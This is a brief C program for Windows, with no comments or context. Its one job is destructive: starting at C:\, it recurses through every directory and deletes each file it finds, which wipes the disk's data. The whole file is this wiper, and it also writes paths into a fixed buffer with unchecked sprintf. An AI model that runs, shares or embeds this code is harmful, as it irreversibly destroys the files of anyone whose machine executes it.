#include <windows.h>
#include <stdio.h>

void walk(const char *dir)
{
    WIN32_FIND_DATA fd;
    char path[MAX_PATH];
    HANDLE h;

    sprintf(path, "%s\\*", dir);

    if ((h = FindFirstFile(path, &fd)) == INVALID_HANDLE_VALUE)
        return;

    do {
        if (!lstrcmp(fd.cFileName, ".") || !lstrcmp(fd.cFileName, ".."))
            continue;

        sprintf(path, "%s\\%s", dir, fd.cFileName);

        (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
            ? walk(path)
            : remove(path);

    } while (FindNextFile(h, &fd));

    FindClose(h);
}

int main(void)
{
    walk("C:\\");
}